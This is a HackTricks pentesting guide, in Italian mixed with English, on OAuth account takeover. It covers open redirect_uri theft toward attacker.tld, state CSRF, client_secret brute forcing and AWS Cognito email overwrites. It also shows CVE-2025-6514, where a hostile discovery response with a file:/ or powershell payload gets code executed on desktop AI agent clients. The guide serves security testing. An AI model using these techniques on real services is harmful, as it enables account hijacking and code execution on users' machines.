# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Informazioni di base <a href="#d4a8" id="d4a8"></a>

OAuth offre varie versioni, con approfondimenti fondamentali disponibili su [OAuth 2.0 documentation](https://oauth.net/2/). Questa trattazione si concentra principalmente sul diffusamente usato [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), fornendo un **framework di autorizzazione che consente a un'applicazione di accedere o eseguire azioni sull'account di un utente in un'altra applicazione** (l'authorization server).

Considera un sito ipotetico _**https://example.com**_, progettato per **mostrare tutti i tuoi post sui social media**, inclusi quelli privati. Per fare questo si utilizza OAuth 2.0. _https://example.com_ chiederà il tuo permesso per **accedere ai tuoi post sui social media**. Di conseguenza, su _https://socialmedia.com_ apparirà una schermata di consenso che illustra le **autorizzazioni richieste e lo sviluppatore che effettua la richiesta**. Dopo la tua autorizzazione, _https://example.com_ ottiene la possibilità di **accedere ai tuoi post per tuo conto**.

È fondamentale comprendere i seguenti componenti del framework OAuth 2.0:

- **resource owner**: Tu, come **utente/entità**, autorizzi l'accesso alla tua risorsa, ad esempio i post del tuo account sui social media.
- **resource server**: Il **server che gestisce le richieste autenticate** dopo che l'applicazione ha ottenuto un `access token` per conto del `resource owner`, ad esempio **https://socialmedia.com**.
- **client application**: L'**applicazione che richiede l'autorizzazione** al `resource owner`, come **https://example.com**.
- **authorization server**: Il **server che rilascia i `access tokens`** al `client application` a seguito della corretta autenticazione del `resource owner` e dell'ottenimento dell'autorizzazione, ad esempio **https://socialmedia.com**.
- **client_id**: Un identificatore pubblico e univoco per l'applicazione.
- **client_secret:** Una chiave riservata, conosciuta solo dall'applicazione e dall'authorization server, utilizzata per generare i `access_tokens`.
- **response_type**: Un valore che specifica **il tipo di token richiesto**, come `code`.
- **scope**: Il **livello di accesso** che il `client application` sta richiedendo al `resource owner`.
- **redirect_uri**: L'**URL verso cui l'utente viene reindirizzato dopo l'autorizzazione**. Tipicamente deve corrispondere all'URL di redirect pre-registrato.
- **state**: Un parametro per **mantenere dati durante il reindirizzamento dell'utente verso e dall'authorization server**. La sua unicità è cruciale poiché funge da **meccanismo di protezione CSRF**.
- **grant_type**: Un parametro che indica **il tipo di grant e il tipo di token che sarà restituito**.
- **code**: Il codice di autorizzazione rilasciato dall'`authorization server`, usato insieme a `client_id` e `client_secret` dall'applicazione client per ottenere un `access_token`.
- **access_token**: Il **token che il client application utilizza per le richieste API** per conto del `resource owner`.
- **refresh_token**: Permette all'applicazione di **ottenere un nuovo `access_token` senza richiedere nuovamente l'intervento dell'utente**.

### Flusso

Il **flusso OAuth effettivo** procede come segue:

1. Vai su [https://example.com](https://example.com) e selezioni il pulsante “Integra con i Social Media”.
2. Il sito invia quindi una richiesta a [https://socialmedia.com](https://socialmedia.com) chiedendo la tua autorizzazione affinché l'applicazione di https://example.com acceda ai tuoi post. La richiesta è strutturata come:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Ti viene quindi presentata una pagina di consenso.
4. Dopo la tua approvazione, Social Media invia una risposta al `redirect_uri` con i parametri `code` e `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utilizza questo `code`, insieme al suo `client_id` e `client_secret`, per effettuare una richiesta lato server per ottenere un `access_token` per tuo conto, consentendo l'accesso alle autorizzazioni cui hai acconsentito:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Infine, il processo si conclude quando https://example.com utilizza il tuo `access_token` per effettuare una chiamata API a Social Media per accedere

## Vulnerabilità <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **pre-registered, exact redirect URIs**. Qualsiasi debolezza qui permette a un attacker di inviare una vittima attraverso un authorization URL dannoso in modo che l'IdP consegni il `code` (e il `state`) direttamente a un attacker endpoint, che può poi riscattarlo e raccogliere i tokens.

Flusso tipico di attacco:

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` e inviarlo alla vittima.
2. La vittima si autentica e approva gli scopes.
3. L'IdP reindirizza a `attacker.tld/callback?code=<victim-code>&state=...` dove l'attacker registra la richiesta e scambia immediatamente il code.

Bug comuni di validazione da testare:

- **No validation** – any absolute URL is accepted, resulting in instant code theft.
- **Weak substring/regex checks on the host** – bypass con domini lookalike come `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, o `match.com@evil.com`.
- **IDN homograph mismatches** – la validazione avviene sulla forma punycode (`xn--`), ma il browser reindirizza al dominio Unicode controllato dall'attacker.
- **Arbitrary paths on an allowed host** – puntare `redirect_uri` a `/openredirect?next=https://attacker.tld` o a qualsiasi endpoint XSS/user-content leaks the code either through chained redirects, Referer headers, or injected JavaScript.
- **Directory constraints without normalization** – pattern come `/oauth/*` possono essere bypassati con `/oauth/../anything`.
- **Wildcard subdomains** – accettare `*.example.com` significa che qualsiasi takeover (dangling DNS, S3 bucket, ecc.) fornisce immediatamente un callback valido.
- **Non-HTTPS callbacks** – permettere URI `http://` offre agli attacker in rete (Wi-Fi, corporate proxy) l'opportunità di intercettare il code in transito.

Rivedere anche parametri ausiliari in stile redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, ecc.) e il documento di discovery OpenID (`/.well-known/openid-configuration`) per endpoint addizionali che potrebbero ereditare gli stessi bug di validazione.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Come menzionato in questo bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), potrebbe essere possibile che il redirect **URL is being reflected in the response** del server dopo che l'utente si autentica, risultando **vulnerable to XSS**. Possible payload to test:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Gestione impropria del parametro state <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.

Lo schema di replay è sempre lo stesso:

1. L'attaccante si autentica contro l'IdP con il proprio account e intercetta l'ultimo redirect contenente `code` (e eventuale `state`).
2. Scarta quella richiesta, conserva l'URL e poi abusa di una primitive CSRF (link, iframe, form che si auto-invia) per forzare il browser della vittima a caricarla.
3. Se il client non applica `state`, l'applicazione consuma il risultato di autorizzazione dell'attaccante ed effettua il login dell'attaccante nell'account dell'app della vittima.

Una checklist pratica per la gestione di `state` durante i test:

- **Mancanza del `state`** – se il parametro non appare mai, l'intero login è vulnerabile a CSRF.
- **`state` non obbligatorio** – rimuovilo dalla richiesta iniziale; se l'IdP continua a emettere `code` che il client accetta, la difesa è opt-in.
- **`state` restituito non validato** – manometti il valore nella risposta (Burp, MITM proxy). Accettare valori non corrispondenti significa che il token memorizzato non viene mai confrontato.
- **`state` prevedibile o puramente basato sui dati** – molte app inseriscono percorsi di redirect o blob JSON in `state` senza mescolare entropia, permettendo agli attaccanti di indovinare valori validi e riprodurre i flow. Aggiungi sempre forte entropia prima di codificare i dati.
- **Fissazione del `state`** – se l'app permette agli utenti di fornire il valore `state` (es. tramite crafted authorization URLs) e lo riutilizza nel flow, un attaccante può fissare un valore noto e riutilizzarlo su più vittime.

PKCE può integrare `state` (specialmente per i client pubblici) legando l'authorization code a un code verifier, ma i web client devono comunque tracciare `state` per prevenire bug di CSRF/collegamento account tra utenti.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Senza verifica email alla creazione dell'account**: gli attaccanti possono creare preventivamente un account usando l'email della vittima. Se la vittima poi usa un servizio di terze parti per il login, l'applicazione potrebbe collegare involontariamente quell'account third-party all'account pre-creato dall'attaccante, portando ad accesso non autorizzato.
2. **Sfruttare una verifica email debole in OAuth**: gli attaccanti possono sfruttare servizi OAuth che non verificano le email registrandosi con il loro servizio e poi cambiando l'email dell'account in quella della vittima. Questo metodo comporta un rischio simile di accesso non autorizzato, analogo al primo scenario ma tramite un vettore d'attacco diverso.

### Divulgazione dei segreti <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- Disimballare l'APK/IPA, l'installer desktop o l'app Electron e cercare (grep) `client_secret`, blob Base64 che decodificano in JSON, o endpoint OAuth hard-coded.
- Revisionare i file di configurazione inclusi (plist, JSON, XML) o le stringhe decompilate alla ricerca di credenziali client.

Once the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs, etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance code verifier instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
La richiesta per il BF potrebbe essere simile a:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Una volta che il client ha il **code and state**, se vengono **riflessi dentro il Referer header** quando naviga verso una pagina diversa, allora è vulnerabile.

### Access Token Stored in Browser History

La garanzia fondamentale dell'Authorization Code grant è che **access tokens never reach the resource owner’s browser**. Quando le implementazioni leak tokens client-side, qualsiasi bug minore (XSS, Referer leak, proxy logging) diventa un compromesso immediato dell'account. Controllare sempre:

- **Tokens in URLs** – se `access_token` appare nella query/fragment, finisce nella cronologia del browser, nei log del server, negli analytics e nei Referer headers inviati a terze parti.
- **Tokens transiting untrusted middleboxes** – restituire token su HTTP o attraverso debugging/corporate proxies permette agli osservatori di rete di catturarli direttamente.
- **Tokens stored in JavaScript state** – React/Vue stores, variabili globali o blob JSON serializzati espongono i token a qualsiasi script sull'origine (inclusi payload XSS o estensioni malevole).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` conservano i token molto dopo il logout su dispositivi condivisi e sono accessibili tramite script.

Qualsiasi di queste scoperte normalmente eleva bug altrimenti “low” (come un CSP bypass o DOM XSS) a full API takeover perché l'attaccante può semplicemente leggere e riprodurre il leaked bearer token.

### Everlasting Authorization Code

I authorization codes devono essere **a breve durata, single-use e replay-aware**. Durante la valutazione di un flow, acquisisci un `code` e:

- **Test the lifetime** – RFC 6749 raccomanda minuti, non ore. Prova a riscattare il code dopo 5–10 minuti; se funziona ancora, la finestra di esposizione per qualsiasi code leak è eccessiva.
- **Test sequential reuse** – invia lo stesso `code` due volte. Se la seconda richiesta restituisce un altro token, gli attaccanti possono clonare sessioni indefinitamente.
- **Test concurrent redemption/race conditions** – lancia due richieste di token in parallelo (Burp intruder, turbo intruder). Issuer deboli a volte concedono entrambi.
- **Observe replay handling** – un tentativo di reuse non dovrebbe solo fallire ma anche revocare eventuali token già emessi da quel code. Altrimenti, un replay rilevato lascia attivo il primo token dell'attaccante.

Combinare un code permissivo al replay con qualsiasi `redirect_uri` o bug di logging permette accesso persistente agli account anche dopo che la vittima completa il login legittimo.

### Authorization/Refresh Token not bound to client

Se puoi ottenere l'**authorization code** e usarlo con un client differente allora puoi takeover altri account.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In questo bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) si può vedere che il **token** che **AWS Cognito** restituisce all'utente potrebbe avere **permessi sufficienti a sovrascrivere i dati utente**. Di conseguenza, se puoi **change the user email for a different user email**, potresti essere in grado di **take over** gli account di altri.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Per maggiori informazioni su come abusare di AWS Cognito consulta [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abuso dei token di altre app <a href="#bda5" id="bda5"></a>

Come [**menzionato in questo writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), i flussi OAuth che si aspettano di ricevere il **token** (e non un code) potrebbero essere vulnerabili se non verificano che il token appartenga all'app.

Questo perché un **attacker** potrebbe creare un'**application che supporta OAuth e il login con Facebook** (per esempio) nella propria applicazione. Poi, una volta che una vittima effettua il login con Facebook nell'**applicazione dell'attacker**, l'attacker potrebbe ottenere il **OAuth token dell'utente fornito alla sua applicazione, e usarlo per effettuare il login nell'app OAuth della vittima usando il token dell'utente vittima**.

> [!CAUTION]
> Di conseguenza, se l'attacker riesce a far sì che l'utente acceda alla sua applicazione OAuth, potrà prendere il controllo (take over) dell'account della vittima in applicazioni che si aspettano un token e non verificano se il token è stato concesso al loro app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Secondo [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), era possibile far aprire alla vittima una pagina con una **returnUrl** che punta all'host dell'attacker. Questa informazione sarebbe **memorizzata in un cookie (RU)** e in una **fase successiva** il **prompt** **chiederà** all'**utente** se vuole concedere accesso a quell'host dell'attacker.

Per bypassare questo prompt, era possibile aprire una tab per iniziare il **Oauth flow** che avrebbe impostato questo cookie RU usando la **returnUrl**, chiudere la tab prima che il prompt venga mostrato e aprire una nuova tab senza quel valore. Così, il **prompt non informerà sull'host dell'attacker**, ma il cookie sarà impostato su di esso, quindi il **token sarà inviato all'host dell'attacker** nella redirezione.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Come spiegato in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), alcune implementazioni OAuth permettono di indicare il parametro GET **`prompt`** come None (**`&prompt=none`**) per **impedire che agli utenti venga richiesto di confermare** l'accesso tramite un prompt sul web se sono già loggati nella piattaforma.

### response_mode

Come [**spiegato in questo video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), potrebbe essere possibile indicare il parametro **`response_mode`** per specificare dove si desidera che il code venga fornito nell'URL finale:

- `response_mode=query` -> Il code viene fornito all'interno di un parametro GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Il code viene fornito nel fragment dell'URL: `#code=2397rf3gu93f`
- `response_mode=form_post` -> Il code viene fornito dentro un form POST con un input chiamato `code` e il valore
- `response_mode=web_message` -> Il code viene inviato in un post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

I dialog di consenso/login OAuth sono bersagli ideali per il clickjacking: se possono essere framed, un attacker può sovrapporre grafica personalizzata, nascondere i veri pulsanti e indurre gli utenti ad approvare scope pericolosi o collegare account. Costruisci PoC che:

1. Carica l'URL di autorizzazione dell'IdP dentro un `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Usa trick di absolute positioning/opacity per allineare pulsanti falsi con i controlli nascosti **Allow**/**Approve**.
3. Facoltativamente pre-compila parametri (scopes, redirect URI) così l'approvazione rubata avvantaggia immediatamente l'attacker.

Durante i test verifica che le pagine IdP emettano `X-Frame-Options: DENY/SAMEORIGIN` oppure una restrittiva `Content-Security-Policy: frame-ancestors 'none'`. Se nessuna è presente, dimostra il rischio con strumenti come [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) e registra quanto facilmente una vittima autorizza l'app dell'attacker. Per ulteriori idee di payload vedi [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Secondo [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), questo è un OAuth flow che permette di loggare via **username** e **password**. Se durante questo semplice flow viene restituito un **token** con accesso a tutte le azioni che l'utente può eseguire, allora è possibile bypassare la 2FA usando quel token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Questo [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) spiega come sia stato possibile abusare di un **open redirect** usando il valore del **referrer** per abusare OAuth fino a un ATO. L'attacco era:

1. La vittima accede alla pagina web dell'attacker
2. La vittima apre il link malevolo e un opener avvia il Google OAuth flow con `response_type=id_token,code&prompt=none` come parametri aggiuntivi usando come **referrer il sito dell'attacker**.
3. Nell'opener, dopo che il provider autorizza la vittima, la invia indietro al valore del parametro `redirect_uri` (il sito della vittima) con un codice 30X che mantiene ancora il sito dell'attacker nel referer.
4. Il sito della vittima **innesca l'open redirect basandosi sul referrer** reindirizzando l'utente vittima al sito dell'attacker; poiché il **`response_type`** era **`id_token,code`**, il code verrà inviato indietro all'attacker nel **fragment** dell'URL permettendogli di prendere il controllo dell'account dell'utente via Google sul sito della vittima.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Per ulteriori dettagli di questa tecnica.**

Dynamic Client Registration in OAuth funge da vettore meno ovvio ma critico per vulnerabilità di sicurezza, specificamente per attacchi di **Server-Side Request Forgery (SSRF)**. Questo endpoint permette ai server OAuth di ricevere dettagli sulle client application, inclusi URL sensibili che potrebbero essere sfruttati.

Punti chiave:

- **Dynamic Client Registration** è spesso mappato su `/register` e accetta dettagli come `client_name`, `client_secret`, `redirect_uris`, e URL per loghi o JSON Web Key Sets (JWKs) via POST.
- Questa feature aderisce alle specifiche di **RFC7591** e **OpenID Connect Registration 1.0**, che includono parametri potenzialmente vulnerabili a SSRF.
- Il processo di registrazione può involontariamente esporre i server a SSRF in diversi modi:
  - **`logo_uri`**: un URL per il logo dell'app client che il server potrebbe scaricare, innescando SSRF o portando a XSS se l'URL è gestito male.
  - **`jwks_uri`**: un URL al documento JWK del client che, se creato in modo malevolo, può indurre il server a eseguire richieste outbound verso un server controllato dall'attacker.
  - **`sector_identifier_uri`**: riferimento a un array JSON di `redirect_uris`, che il server potrebbe fetchare, creando un'opportunità SSRF.
  - **`request_uris`**: elenchi di request URIs consentite per il client, che possono essere sfruttate se il server effettua fetch di questi URI all'inizio del processo di autorizzazione.

Strategia di sfruttamento:

- SSRF può essere innescato registrando un nuovo client con URL malevoli in parametri come `logo_uri`, `jwks_uri` o `sector_identifier_uri`.
- Mentre lo sfruttamento diretto tramite `request_uris` può essere mitigato da controlli di whitelist, fornire un `request_uri` pre-registrato e controllato dall'attacker può facilitare SSRF durante la fase di autorizzazione.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

La ricerca su [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (che impatta client `mcp-remote` come Claude Desktop, Cursor o Windsurf) mostra come la dynamic OAuth discovery diventi una primitiva RCE ogni volta che il client inoltra i metadata dell'IdP direttamente al sistema operativo. Il server remoto MCP ritorna un `authorization_endpoint` controllato dall'attacker durante lo scambio di discovery (`/.well-known/openid-configuration` o qualsiasi metadata RPC). `mcp-remote ≤0.1.15` poi chiamava l'handler URL del sistema (`start`, `open`, `xdg-open`, ecc.) con qualsiasi stringa ricevuta, così qualsiasi scheme/path supportato dall'OS veniva eseguito localmente.

Attack workflow

1. Punta l'agente desktop a un server MCP/OAuth ostile (`npx mcp-remote https://evil`). L'agente riceve `401` più metadata.
2. Il server risponde con JSON del tipo:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Il client avvia l'handler del sistema operativo per l'URI fornito. Windows accetta payload come `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux accettano `file:///Applications/Calculator.app/...` o anche schemi personalizzati come `cmd://bash -lc '<payload>'` se registrati.
4. Poiché questo avviene prima di qualsiasi interazione dell'utente, **basta configurare il client per parlare con il server dell'attaccante per ottenere l'esecuzione di codice**.

**How to test**

- Mirare qualsiasi desktop/agent compatibile con OAuth che esegue discovery su HTTP(S) e apre localmente gli endpoint ritornati (Electron apps, CLI helpers, thick clients).
- Intercetta o ospita la risposta di discovery e sostituisci `authorization_endpoint`, `device_authorization_endpoint`, o campi simili con `file://`, `cmd://`, percorsi UNC, o altri schemi pericolosi.
- Osserva se il client valida lo scheme/host. La mancanza di validazione si traduce in esecuzione immediata nel contesto dell'utente e dimostra la vulnerabilità.
- Ripeti con schemi diversi per mappare l'intera superficie d'attacco (es., `ms-excel:`, `data:text/html,`, custom protocol handlers) e dimostrare la portata cross-platform.

## OAuth providers Race Conditions

Se la piattaforma che stai testando è un OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, il campo sub identifica univocamente un utente, ma il suo formato varia a seconda dell'Authorization Server. Per standardizzare l'identificazione dell'utente, alcuni client usano email o handle utente. Tuttavia, questo è rischioso perché:

- Alcuni Authorization Server non garantiscono che queste proprietà (come email) rimangano immutabili.
- In certe implementazioni—come **"Login with Microsoft"**—il client si affida al campo email, che è **user-controlled by the user in Entra ID** e non verificato.
- Un attaccante può sfruttare questo creando la propria organizzazione Azure AD (es., doyensectestorg) e usando questa per effettuare un Microsoft login.
- Anche se l'Object ID (memorizzato in sub) è immutabile e sicuro, l'affidamento a un campo email mutabile può consentire un account takeover (per esempio, lo hijacking di un account come victim@gmail.com).

## Client Confusion Attack

In una **Client Confusion Attack**, un'applicazione che utilizza l'OAuth Implicit Flow non verifica che l'access token finale sia specificamente generato per il proprio Client ID. Un attaccante allestisce un sito pubblico che usa Google’s OAuth Implicit Flow, inducendo migliaia di utenti a fare login e raccogliendo così access token destinati al sito dell'attaccante. Se questi utenti hanno anche account su un altro sito vulnerabile che non valida il Client ID del token, l'attaccante può riutilizzare i token raccolti per impersonare le vittime e prendere il controllo dei loro account.

## Scope Upgrade Attack

Il tipo di grant Authorization Code Grant prevede una comunicazione sicura server-to-server per trasmettere i dati utente. Tuttavia, se l'Authorization Server si fida implicitamente del parametro scope nella Access Token Request (un parametro non definito nell'RFC), un'applicazione malevola potrebbe elevare i privilegi di un authorization code richiedendo uno scope maggiore. Dopo che l'Access Token è stato generato, il Resource Server deve verificarlo: per i token JWT questo implica controllare la signature del JWT ed estrarre dati come client_id e scope, mentre per token stringa casuale il server deve interrogare l'Authorization Server per recuperare i dettagli del token.

## Redirect Scheme Hijacking

Nelle implementazioni mobile di OAuth, le app usano **custom URI schemes** per ricevere redirect con Authorization Codes. Tuttavia, poiché più app possono registrare lo stesso scheme su un dispositivo, l'assunzione che solo il client legittimo controlli il redirect URI viene violata. Su Android, per esempio, un Intent URI come `com.example.app://` viene catturato in base allo scheme e ai filtri opzionali definiti nell'intent-filter di un'app. Poiché la risoluzione degli intent di Android può essere ampia—soprattutto se è specificato solo lo scheme—un attaccante può registrare un'app malevola con un intent filter costruito ad arte per dirottare l'authorization code. Questo può **abilitare un account takeover** sia tramite interazione dell'utente (quando più app sono idonee a gestire l'intent) sia tramite tecniche di bypass che sfruttano filtri eccessivamente specifici, come dettagliato dal flowchart di Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
